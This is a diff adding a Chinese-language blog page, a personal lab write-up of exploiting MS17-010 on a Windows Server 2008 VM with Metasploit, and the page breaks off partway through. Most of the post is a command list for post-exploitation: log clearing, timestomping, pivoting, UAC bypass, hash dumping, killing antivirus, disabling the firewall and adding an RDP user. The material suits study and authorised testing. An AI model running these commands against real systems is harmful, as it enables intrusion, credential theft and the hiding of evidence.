@@ -1,0 +1,762 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="对永恒之蓝漏洞的一个复现   不适合人类阅读，非常水的自我笔记 靶机难度：十分简单">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MS17-010复现-部分后渗透指令">
+<meta property="og:url" content="http://atsud0.me/2020/04/14/MS17-010%E5%A4%8D%E7%8E%B0-%E9%83%A8%E5%88%86%E5%90%8E%E6%B8%97%E9%80%8F%E6%8C%87%E4%BB%A4/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="对永恒之蓝漏洞的一个复现   不适合人类阅读，非常水的自我笔记 靶机难度：十分简单">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20191210_163742_ms17_010_arp_scan.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20191210_170017_ms17_010_nmap_port_scan.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20191210_184912_ms17_010_scanner_ms17.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20191210_185233_msfconsole_ms17010_run.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20191211_105220_persistence_regedit.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20191211_103433_persistence.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20191211_110850_metsvc_bind_tcp.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20191211_133343_.png">
+<meta property="article:published_time" content="2020-04-14T03:18:08.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.272Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="Metasploit">
+<meta property="article:tag" content="MS17_010">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/Screenshot_20191210_163742_ms17_010_arp_scan.png">
+
+<link rel="canonical" href="http://atsud0.me/2020/04/14/MS17-010%E5%A4%8D%E7%8E%B0-%E9%83%A8%E5%88%86%E5%90%8E%E6%B8%97%E9%80%8F%E6%8C%87%E4%BB%A4/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>MS17-010复现-部分后渗透指令 | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/04/14/MS17-010%E5%A4%8D%E7%8E%B0-%E9%83%A8%E5%88%86%E5%90%8E%E6%B8%97%E9%80%8F%E6%8C%87%E4%BB%A4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MS17-010复现-部分后渗透指令
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-04-14 11:18:08" itemprop="dateCreated datePublished" datetime="2020-04-14T11:18:08+08:00">2020-04-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">靶机实验</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>12k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>11 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>对永恒之蓝漏洞的一个复现 <br /> </p>
+<p>不适合人类阅读，非常水的自我笔记</p>
+<p>靶机难度：十分简单</p>
+<a id="more"></a>
+
+<ul>
+<li>靶机:<br /> Windows Server 2008 <br /> </li>
+</ul>
+<p>192.168.1.84</p>
+<ul>
+<li>攻击机:<br /> Kali 2019.04 <br /> 192.168.1.83</li>
+</ul>
+<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><p>先扫描当前网段存活的主机，可以使用<code>nmap</code>,也可以使用<code>netdiscover</code>,<code>arp-scan</code>等工具。</p>
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>nmap -sn -PR 192.168.1.0/24</p>
+<p>使用此命令会使用nmap的arp ping扫描模式来发现存活主机<br><a href="https://nmap.org/man/zh/man-host-discovery.html" target="_blank" rel="noopener">官方解释</a></p>
+<blockquote>
+<p>最常见的Nmap使用场景之一是扫描一个以太局域网。 在大部分局域网上，特别是那些使用基于 RFC1918私有地址范围的网络，在一个给定的时间绝大部分 IP地址都是不使用的。 当Nmap试图发送一个原始IP报文如ICMP回声请求时， 操作系统必须确定对应于目标IP的硬件 地址(ARP)，这样它才能把以太帧送往正确的地址。 这一般比较慢而且会有些问题，因为操作系统设计者认为一般不会在短时间内 对没有运行的机器作几百万次的ARP请求。<br>当进行ARP扫描时，Nmap用它优化的算法管理ARP请求。 当它收到响应时， Nmap甚至不需要担心基于IP的ping报文，既然它已经知道该主机正在运行了。 这使得ARP扫描比基于IP的扫描更快更可靠。 所以默认情况下，如果Nmap发现目标主机就在它所在的局域网上，它会进行ARP扫描。 即使指定了不同的ping类型(如 -PI或者 -PS) ，Nmap也会对任何相同局域网上的目标机使用ARP。 如果您真的不想要ARP扫描，指定 –send-ip。<br>nmap -sP 192.168.1.0/24<br>你也可以使用这条命令，在特权用户下，会默认发送ARP包探测。</p>
+</blockquote>
+<h4 id="arp-scan"><a href="#arp-scan" class="headerlink" title="arp-scan"></a>arp-scan</h4><p>arp-scan –interface=eth1 –localnet</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20191210_163742_ms17_010_arp_scan.png" alt="arp_scan"></p>
+<h3 id="探测主机服务"><a href="#探测主机服务" class="headerlink" title="探测主机服务"></a>探测主机服务</h3><p>探测主机开放来什么端口以及服务</p>
+<p>nmap -sS -A -sV -T4 192.168.1.aa</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20191210_170017_ms17_010_nmap_port_scan.png" alt="nmap_scan_report"></p>
+<p>发现是Windows系统，并发现开发了445端口，可以尝试是否可以利用ms17_010漏洞。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以先使用<code>auxiliary/scanner/smb/smb_ms17_010</code>模块来看主机是否合适使用ms17漏洞</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20191210_184912_ms17_010_scanner_ms17.png" alt="exp"><br>使用辅助模块扫描</p>
+<p>可以看到以下语句的结果出现，说明该主机很容易受到ms17_010漏洞的攻击。</p>
+<blockquote>
+<p>[+] 192.168.1.84:445      - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7600 x64 (64-bit)</p>
+</blockquote>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20191210_185233_msfconsole_ms17010_run.png" alt="exp-1"><br>设置参数并进行攻击<br>默认的payload是默认反弹到cmdshell，所以可以设置payload反弹到meterpreter以便后续的渗透。</p>
+<p>参数说明</p>
+<ul>
+<li>rhosts 目标IP</li>
+<li>lhost 攻击机的ip</li>
+<li>port 端口</li>
+</ul>
+<p>出现meterpreter的shell之后，就说明我们的攻击成功来，接下来就要进行设置后门，维持权限等操作了。</p>
+<h3 id="拿到cmd-shell后乱码"><a href="#拿到cmd-shell后乱码" class="headerlink" title="拿到cmd shell后乱码"></a>拿到cmd shell后乱码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure>
+
+<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="进程转移"><a href="#进程转移" class="headerlink" title="进程转移"></a>进程转移</h3><p>可以在<code>meterpreter</code>中使用<code>migrate</code>进行手动转移</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; migrate 1904</span><br><span class="line">[*] Migrating from 1160 to 1904...</span><br><span class="line">[*] Migration completed successfully.</span><br></pre></td></tr></table></figure>
+<p>也可以使用<code>run post/windows/manage/migrate</code>进行自动转移</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br><span class="line"></span><br><span class="line">[*] Running module against WIN-L7LB8P6KDBM</span><br><span class="line">[*] Current server process: Dwm.exe (1904)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 2636</span><br><span class="line">[+] Successfully migrated to process 2636</span><br></pre></td></tr></table></figure>
+
+<h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sysinfo  #查看系统信息</span><br><span class="line">getuid #当前用户 </span><br><span class="line">getpid #当前进程ID</span><br><span class="line">ps #所有进程</span><br><span class="line">shell #进入目标机的shell</span><br><span class="line">sessions #查看已经成功获取的会话</span><br><span class="line">sessions -i &lt;id&gt; #进入会话 -h 帮助 -k 杀死会话</span><br><span class="line">backgroup #将当前会话放置到后台</span><br><span class="line">info #查看模块信息</span><br><span class="line">run #执行已有的模块</span><br><span class="line">idletiome #查看目标机器闲置时间</span><br><span class="line">reboot &amp; shutdown #重启 关机</span><br></pre></td></tr></table></figure>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">getwd &amp; pwd #查看当前目录</span><br><span class="line">ls &amp; dir #列出当前目录的文件</span><br><span class="line">cd #切换目录</span><br><span class="line">search -f *.txt -d c:\ #搜索在C驱动器的文件类型为txt的文件</span><br><span class="line">cat #查看文件内容</span><br><span class="line">upload #上传本地文件到目标</span><br><span class="line">download #下载目标文件到本地</span><br><span class="line">edit #编辑文件</span><br><span class="line">rm #删除文件</span><br><span class="line">mkdir #创建目录</span><br><span class="line">rmdir #删除目录</span><br><span class="line">getlwd &amp; lpwd #查看攻击机本地目录</span><br><span class="line">lcd #切换攻击机本地目录</span><br></pre></td></tr></table></figure>
+
+<h3 id="执行文件"><a href="#执行文件" class="headerlink" title="执行文件"></a>执行文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe #创建新进程cmd.exe -H 不可见 -i 可交互</span><br></pre></td></tr></table></figure>
+
+<h3 id="清除日志"><a href="#清除日志" class="headerlink" title="清除日志"></a>清除日志</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev&#x2F;clearav #现在是claerev 不过以前的版本好像是clearav</span><br></pre></td></tr></table></figure>
+
+<h3 id="timestomp-伪造时间"><a href="#timestomp-伪造时间" class="headerlink" title="timestomp 伪造时间"></a>timestomp 伪造时间</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">timestomp C:&#x2F;&#x2F; -h #查看帮助</span><br><span class="line">timestomp -v C:&#x2F;&#x2F;2.txt  #查看2.txt的时间戳</span><br><span class="line">timestomp C:&#x2F;&#x2F;2.txt -f C:&#x2F;&#x2F;1.txt #将2的时间戳复制给1.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="基本网络命令"><a href="#基本网络命令" class="headerlink" title="基本网络命令"></a>基本网络命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig&#x2F;ifconfig</span><br><span class="line">netstat -ano #查看端口</span><br><span class="line">arp #查看arp缓存表</span><br><span class="line">getproxy #查看代理信息</span><br><span class="line">route #查看路由</span><br></pre></td></tr></table></figure>
+
+<h4 id="添加代理"><a href="#添加代理" class="headerlink" title="添加代理"></a>添加代理</h4><p>先添加路由映射.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;multi&#x2F;manage&#x2F;autoroute</span><br><span class="line">run autoroute -s 192.168.56.0&#x2F;24</span><br></pre></td></tr></table></figure>
+<p>然后使用 socks4a 模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;socks4a</span><br></pre></td></tr></table></figure>
+<p>配置好后,直接run.之后就在kali中设置代理127.0.0.1 1080.</p>
+<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>除了用<code>portfwd</code>外同样也可以使用<code>enable_edp</code>和<code>getgui</code>实际上<code>enable_rdp</code>的添加端口，就是使用了<code>portfwd</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run portfwd add -l 8888 -p 3389 -r 127.0.0.1 #将目标的3389转发到本地的8888端口</span><br><span class="line">run getgui -f 6662 -e #端口转发</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6666 #端口转发</span><br></pre></td></tr></table></figure>
+
+<h4 id="autoroute添加路由"><a href="#autoroute添加路由" class="headerlink" title="autoroute添加路由"></a>autoroute添加路由</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -h #查看帮助</span><br><span class="line">run autoroute -s 192.168.56.0&#x2F;24 #添加到目标环境网络</span><br><span class="line">run autoroute -p #查看添加的路由</span><br></pre></td></tr></table></figure>
+
+<p>autoroute已经是旧的命令了,新版msf已经建议使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;multi&#x2F;manage&#x2F;autoroute  # 添加路由转发</span><br></pre></td></tr></table></figure>
+
+<p>然后可以利用<code>arp_scanner</code>,<code>portscan</code>等进行扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner rhosts&#x3D;192.168.56.0&#x2F;24</span><br><span class="line">run auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp rhosts&#x3D;192.168.56.102 ports&#x3D;22</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h3 id="local-exploit-suggester"><a href="#local-exploit-suggester" class="headerlink" title="local_exploit_suggester"></a>local_exploit_suggester</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</span><br></pre></td></tr></table></figure>
+
+<h4 id="getsystem"><a href="#getsystem" class="headerlink" title="getsystem"></a>getsystem</h4><p>getsystem工作原理:</p>
+<blockquote>
+<p>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br />②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br />③Windows服务已启动，导致与命名管道建立连接。<br />④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br />然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p>
+</blockquote>
+<h4 id="bypassuac"><a href="#bypassuac" class="headerlink" title="bypassuac"></a>bypassuac</h4><p>运行后返回一个新的会话，再用<code>getsystem</code>提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">use windows&#x2F;local&#x2F;bypassuac_vbs</span><br><span class="line">use windows&#x2F;local&#x2F;ask</span><br></pre></td></tr></table></figure>
+
+<h4 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h4><p>先使用<code>run post/windows/gather/enum_patches  #查看补丁信息</code>然后看缺少哪个补丁，就利用那个补丁的漏洞进行攻击</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;checkvm #是否虚拟机</span><br><span class="line">run post&#x2F;linux&#x2F;gather&#x2F;checkvm #是否虚拟机</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives #查看分区</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications #获取安装软件信息</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;dumplinks   #获取最近的文件操作</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_ie  #获取IE缓存</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_chrome   #获取Chrome缓存</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_patches  #补丁信息</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_domain  #查找域控</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users #查看当前多少活跃用户</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump #获取系统hash值 需要使用system权限</span><br></pre></td></tr></table></figure>
+
+<h4 id="scraper"><a href="#scraper" class="headerlink" title="scraper"></a>scraper</h4><p>这个脚本会收集目标机器上的常见信息，然后将它们下载保存在本地。这个脚本还可以加入自定义的命令。<br />只需执行<code>run scraper</code>即可运行脚本。<br /><code>/.msf4/logs/</code>下保存了所有脚本需要保存的日志记录，当然不只这一个脚本。同样.msf4文件夹下还保存了其他东西，比如输入过的命令，msf运行过程的日志等。 Scraper脚本将保存结果在<code>/.msf4/logs/scripts/scraper/</code>下。</p>
+<h4 id="查看目标主机是否是虚拟机"><a href="#查看目标主机是否是虚拟机" class="headerlink" title="查看目标主机是否是虚拟机"></a>查看目标主机是否是虚拟机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;checkvm</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;checkvm</span><br><span class="line"></span><br><span class="line">[*] Checking if WIN-L7LB8P6KDBM is a Virtual Machine .....</span><br><span class="line">[+] This is a Sun VirtualBox Virtual Machine</span><br></pre></td></tr></table></figure>
+<h4 id="关闭杀软"><a href="#关闭杀软" class="headerlink" title="关闭杀软"></a>关闭杀软</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;killav</span><br></pre></td></tr></table></figure>
+
+<h4 id="关闭防火墙-Cmd命令"><a href="#关闭防火墙-Cmd命令" class="headerlink" title="关闭防火墙(Cmd命令)"></a>关闭防火墙(Cmd命令)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="开启3389"><a href="#开启3389" class="headerlink" title="开启3389"></a>开启3389</h4><p>开启远程端口并创建用户可以使用<code>getgui</code>或者是<code>enable_rdp</code>这两个其中一个脚本，但是建议使用<code>enable_rdp</code>,因为使用<code>getgui</code>有时候虽然提示是创建用户成功，但是却是无法登录的。</p>
+<h5 id="enable-rdp"><a href="#enable-rdp" class="headerlink" title="enable_rdp"></a>enable_rdp</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp #开启远程桌面</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;test PASSWORD&#x3D;!QAZ2wsx#EDC #添加用户</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6666 #端口转发</span><br></pre></td></tr></table></figure>
+
